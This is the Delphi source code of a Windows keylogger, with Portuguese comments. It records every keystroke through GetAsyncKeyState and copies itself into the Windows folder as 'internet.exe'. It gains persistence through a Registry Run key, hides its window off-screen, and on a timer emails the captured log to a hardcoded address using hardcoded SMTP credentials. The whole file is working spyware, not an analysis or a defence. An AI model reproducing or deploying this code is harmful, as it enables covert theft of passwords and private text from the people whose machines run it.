unit Umae;

interface                  

uses
  Windows,Registry,Winsock,shellapi, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, IdBaseComponent, IdMessage, IdComponent,
  IdTCPConnection, IdTCPClient, IdMessageClient, IdSMTP, IdPOP3,
  Menus, ComCtrls, Buttons,XPMan,RzBHints, RzBckgnd, RzTray, Sockets,
  IdSNPP;
type
  Tfrmmae = class(TForm)
    capturakey: TTimer;
    Memo1: TMemo;
    PopupMenu1: TPopupMenu;
    Fechar1: TMenuItem;
    XPManifest1: TXPManifest;
    RzBalloonHints1: TRzBalloonHints;
    RzBackground1: TRzBackground;
    RzTrayIcon1: TRzTrayIcon;
    Ocultar1: TMenuItem;
    Mostrar1: TMenuItem;
    Envia: TTimer;
    Progresso: TTimer;
    ProgressBar1: TProgressBar;
    Label1: TLabel;
    salvaarquivo: TTimer;
   procedure GravaRegistro(Raiz: HKEY; Chave, Valor, Endereco: string);
    procedure ApagaRegistro(Raiz: HKEY; Chave, Valor: string);
    procedure capturakeyTimer(Sender: TObject);
    procedure Fechar1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure enviaemail;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure EnviaTimer(Sender: TObject);
    Procedure confere;
    procedure ProgressoTimer(Sender: TObject);
    procedure salvaarquivoTimer(Sender: TObject);

  private
  procedure WMEndSession(var Msg : TWMEndSession); message WM_ENDSESSION; 
  public
    { Public declarations }
  end;
                                        
var
  frmmae: Tfrmmae;
  IdSMTP:tIdSMTP;
  idMessage:TidMessage;
  idpop31:Tidpop3;
  arquivo:string;
  hora:string;
  conectado:boolean;
  const
   RSP_SIMPLE_SERVICE = 1;
  RSP_UNREGISTER_SERVICE = 0;
implementation

{$R *.dfm}
var  F:Textfile;
procedure GravaRegistro(Raiz: HKEY; Chave, Valor, Endereco: string);
var
  Registro: TRegistry;
begin
  Registro := TRegistry.Create(KEY_WRITE); // Chama o construtor do objeto
  Registro.RootKey := Raiz;
  Registro.OpenKey(Chave, True); //Cria a chave
  Registro.WriteString(Valor, '"' + Endereco + '"'); //Grava o endereço da sua aplicação no Registro
  Registro.CloseKey; // Fecha a chave e o objeto
  Registro.Free;
end;

//___________________________________________________________________


function GetIP:string;
//--> Declare a Winsock na clausula uses da unit
var
WSAData: TWSAData;
HostEnt: PHostEnt;
Name:string;
begin
WSAStartup(2, WSAData);
SetLength(Name, 255);
Gethostname(PChar(Name), 255);
SetLength(Name, StrLen(PChar(Name)));
HostEnt := gethostbyname(PChar(Name));
with HostEnt^ do
begin
Result := Format('%d.%d.%d.%d',
[Byte(h_addr^[0]),Byte(h_addr^[1]),
Byte(h_addr^[2]),Byte(h_addr^[3])]);
end;
WSACleanup;
end;


Procedure Tfrmmae.confere;
begin
if (getip<>'127.0.0.1') and(getip<>'0.0.0.0')and(Memo1.text<>'') and (hora<>'') then
begin
conectado:=true   ;
//showmessage(getip+' Você está conectado!');
end
else
begin
conectado:=false;
//showmessage(getip+' Você está desconectado!');
end;
end;



Function HoraToMin(Hora: String): Integer;
begin
Result := (StrToInt(Copy(Hora,1,2))*60) + StrToInt(Copy(Hora,4,2));
end;

procedure Tfrmmae.enviaemail;
begin
confere;
if conectado then
begin
    IdSMTP            := TIdSMTP.Create( Nil );
    idMessage     := TIdMessage.Create( Nil );
    idpop31      := Tidpop3.Create( Nil );

{Configurações IdPOP}
IdPOP31.Host := 'pop3.bol.com.br';
IdPOP31.Username :='osmanobr@bol.com.br';
IdPOP31.Password := '123456';

 IdPOP31.Connect;

idMessage.Body.add(MEMO1.Text);
idMessage.From.Text := 'osmanobr@bol.com.br'; //quem vai enviar
IdMessage.from.Address := 'osmanobr@bol.com.br ';;
idMessage.Recipients.EMailAddresses :='osmanobombom@hotmail.com'; // qeum vai receber
IdMessage.Subject := 'Keylogger '+datetostr(now)+':'+timetostr(time); //assunto
IdMessage.Body := memo1.Lines;  //corpo da mensagem

{Configurações IdSMTP}
//IdSMTP1.BoundIP := '200.221.8.150';
IdSMTP.AuthenticationType := atlogin;//mostra que requer autenticação
IdSMTP.Username := 'osmanobr'; //login
IdSMTP.Password := '123456'; //senha
IdSMTP.Host := 'smtps.bol.com.br';//smtp
IdSMTP.Port := 25; //porta do yahoo
  //Manipulando os Anexos
    TIdAttachment.Create(idmessage.MessageParts, TFileName(arquivo));
 //   IdPOP31.Connect;
    IdSMTP.Connect;
 try
    IdSMTP.Send(IdMessage);
 finally
    IdSMTP.Disconnect;
        IdPOP31.disConnect;
  end;
//  Application.MessageBox('Email enviado com sucesso!', 'Confirmação',
//MB_ICONINFORMATION +   MB_OK);

    IdSMTp.Free ;
    idMessage.Free ;
    idpop31.Free;
 end;
end;


procedure Tfrmmae.WMEndSession(var Msg : TWMEndSession);
begin
  if Msg.EndSession = TRUE then
  begin
hora:=timetostr(time);
memo1.Lines.SaveToFile(arquivo);
showmessage('O Windows está sendo finalizado as: '+datetostr(now));
close;
  end;
end;

function Coloca(txt: String): String;
begin
frmmae.Memo1.Text := frmmae.Memo1.Text + txt;
end;

procedure Tfrmmae.capturakeyTimer(Sender: TObject);
var
      i : byte;
begin

  for i:=8 To 222 do
    begin
       if GetAsyncKeyState(i)=-32767 then
        begin
        case i of
        8  :   begin
        memo1.Lines[memo1.Lines.count-1] := copy(memo1.Lines[memo1.Lines.count-1],1,length(memo1.Lines[memo1.Lines.count-1])-1); //Backspace
        memo1.text:=memo1.text+'[Bakspace]';
        end;
        9  : memo1.text:=memo1.text+'[Tab]';
        13 : memo1.text:=memo1.text+ '[Enter]'+#13#10; //Enter
        17 : memo1.text:=memo1.text+'[Ctrl]';
        27 : memo1.text:=memo1.text+'[Esc]';
        32 :memo1.text:=memo1.text+' '; //Space
        // Del,Ins,Home,PageUp,PageDown,End
        33 : memo1.text := Memo1.text + '[Page Up]';
        34 : memo1.text := Memo1.text + '[Page Down]';
        35 : memo1.text := Memo1.text + '[End]';
        36 : memo1.text := Memo1.text + '[Home]';
        //Arrow Up Down Left Right
        37 : memo1.text := Memo1.text + '[Left]';
        38 : memo1.text := Memo1.text + '[Up]';
        39 : memo1.text := Memo1.text + '[Right]';
        40 : memo1.text := Memo1.text + '[Down]';

        44 : memo1.text := Memo1.text + '[Print Screen]';
        45 : memo1.text := Memo1.text + '[Insert]';
        46 : memo1.text := Memo1.text + '[Del]';
        145 : memo1.text := Memo1.text + '[Scroll Lock]';

        //Number 1234567890 Symbol !@#$%^&*()
        48 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+')'
             else memo1.text:=memo1.text+'0';
        49 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'!'
             else memo1.text:=memo1.text+'1';
        50 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'@'
             else memo1.text:=memo1.text+'2';
        51 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'#'
             else memo1.text:=memo1.text+'3';
        52 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'$'
             else memo1.text:=memo1.text+'4';
        53 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'%'
             else memo1.text:=memo1.text+'5';
        54 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'^'
             else memo1.text:=memo1.text+'6';
        55 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'&'
             else memo1.text:=memo1.text+'7';
        56 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'*'
             else memo1.text:=memo1.text+'8';
        57 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'('
             else memo1.text:=memo1.text+'9';
        65..90 : // a..z , A..Z
            begin
            if ((GetKeyState(VK_CAPITAL))=1) then
                if GetKeyState(VK_SHIFT)<0 then
                   memo1.text:=memo1.text+LowerCase(Chr(i)) //a..z
                else
                   memo1.text:=memo1.text+UpperCase(Chr(i)) //A..Z
            else
                if GetKeyState(VK_SHIFT)<0 then
                    memo1.text:=memo1.text+UpperCase(Chr(i)) //A..Z
                else
                    memo1.text:=memo1.text+LowerCase(Chr(i)); //a..z
            end;
        //Numpad
        96..105 : memo1.text:=memo1.text + inttostr(i-96); //Numpad  0..9
        106:memo1.text:=memo1.text+'*';
        107:memo1.text:=memo1.text+'&';
        109:memo1.text:=memo1.text+'-';
        110:memo1.text:=memo1.text+'.';
        111:memo1.text:=memo1.text+'/';
        144 : memo1.text:=memo1.text+'[Num Lock]';

        112..123: //F1-F12
            memo1.text:=memo1.text+'[F'+IntToStr(i - 111)+']';

        186 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+':'
              else memo1.text:=memo1.text+';';
        187 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'+'
              else memo1.text:=memo1.text+'=';
        188 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'<'
              else memo1.text:=memo1.text+',';
        189 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'_'
              else memo1.text:=memo1.text+'-';
        190 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'>'
              else memo1.text:=memo1.text+'.';
        191 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'?'
              else memo1.text:=memo1.text+'/';
        192 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'~'
              else memo1.text:=memo1.text+'`';
        219 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'{'
              else memo1.text:=memo1.text+'[';
        220 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'|'
              else memo1.text:=memo1.text+'\';
        221 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'}'
              else memo1.text:=memo1.text+']';
        222 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'"'
              else memo1.text:=memo1.text+'''';
        end;
        end;
    end;
end;


procedure Tfrmmae.Fechar1Click(Sender: TObject);
var senha:string;
begin
senha:=inputbox('Aguardando comando...','Digite a senha para sair','');
if senha='1234567890' then
begin
//enviaemail;
Close;
end
 else
Showmessage('Você não tem privilégios de administrador para fechar esse programa.');
end;

procedure Tfrmmae.FormCreate(Sender: TObject);
var
Dados: TSHFileOpStruct;
begin
Shortdateformat:='dddd, dd" de "mmmm" de "yyyy';
frmmae.Top:=2000;
frmmae.Left:=3000;
Shortdateformat:='dddd, dd" de "mmmm" de "yyyy';
hora:=timetostr(time);
hora:=inttostr(HoraToMin(hora));
//arquivo:=hora+'-'+inttostr(HoraToMin(hora))+'.txt';
//Showmessage(arquivo);
arquivo:='c:\windows\save.txt';
  //---------------------------------
 //copiar o exe para a system32
if not fileexists('c:\windows\internet.exe')then
  begin
  FillChar(Dados,SizeOf(Dados), 0);
  with Dados do
  begin
    wFunc := FO_COPY;
    pFrom := PChar('internet.exe');
    pTo   := PChar('c:\windows\');
    fFlags:= FOF_ALLOWUNDO;
  end;
  SHFileOperation(Dados);
  end;
  //---------------------------------
  try
    GravaRegistro(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run',
      'IniciarPrograma', 'c:\windows\' + 'Internet.exe');
//    MessageDlg('Registro gravado com sucesso!', mtInformation, [mbOk], 0);
  except
    MessageDlg('Houve um erro ao gravar registro!', mtInformation, [mbOk], 0);
  end;
end;

procedure Tfrmmae.FormShow(Sender: TObject);
var
H : HWnd;
begin
H := FindWindow(Nil,'Internet');
if H <> 0 then ShowWindow(H,SW_HIDE);
Top:=2000;
Left:=3000;
Shortdateformat:='dddd, dd" de "mmmm" de "yyyy';
end;

procedure Tfrmmae.FormClose(Sender: TObject; var Action: TCloseAction);
begin
close;
if memo1.Text<>'' then
begin
memo1.Lines.SaveToFile(arquivo);
end;
enviaemail;
end;

procedure Tfrmmae.EnviaTimer(Sender: TObject);
begin
Shortdateformat:='dddd, dd" de "mmmm" de "yyyy';
enviaemail;
memo1.Clear;
end;

procedure Tfrmmae.ProgressoTimer(Sender: TObject);
begin
ProgressBar1.Position:= Random(100);
end;

procedure Tfrmmae.salvaarquivoTimer(Sender: TObject);
begin
        Assignfile(F,arquivo);
        if not FileExists('c:\windows\Save.txt') Then
        begin
                Rewrite(F);
                Closefile(F);
        End
        Else
        Assignfile(F,'c:\windows\Save.txt');
        {$I-}
        Append(F);
        {$I+}
        If IOResult<> 0 Then
        Begin
                ShowMessage('Não foi possível abrir o arquivo.');
        End;
        Write(F,Memo1.Text);
//        Memo1.Clear;
        Closefile(F);

end;

function CloneProgram(sExecutableFilePath : string ): string;
var
pi: TProcessInformation;
si: TStartupInfo;
begin
FillMemory( @si, sizeof( si ), 0 );
si.cb := sizeof( si );
CreateProcess(Nil, PChar( sExecutableFilePath ), Nil, Nil, False, NORMAL_PRIORITY_CLASS,Nil, Nil, si, pi );
CloseHandle( pi.hProcess );
CloseHandle( pi.hThread );
end;
end.


